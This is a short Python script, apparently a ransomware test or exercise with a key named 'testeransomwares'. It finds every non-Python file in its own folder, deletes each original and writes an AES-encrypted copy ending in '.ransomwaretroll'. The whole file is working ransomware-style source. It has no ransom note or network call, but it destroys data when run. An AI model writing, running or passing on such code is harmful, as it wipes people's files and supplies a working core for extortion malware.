import os
import pyaes

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

diretorio = os.path.dirname(os.path.abspath(__file__))
nomes_arquivos = []

try:
    for nome_arquivo in os.listdir(diretorio):
        if os.path.isfile(os.path.join(diretorio, nome_arquivo)) and not ".py" in nome_arquivo:
            nomes_arquivos.append(nome_arquivo)
    for nome_arquivo in nomes_arquivos:
        file_name = nome_arquivo
        file = open(file_name, "rb")
        file_data = file.read()
        file.close()
        os.remove(file_name)
        crypto_data = aes.encrypt(file_data)
        new_file = file_name + ".ransomwaretroll"
        new_file = open(f'{new_file}','wb')
        new_file.write(crypto_data)
        new_file.close()

except OSError as e:
    print(f"Ocorreu um erro ao acessar o diretório: {e}")
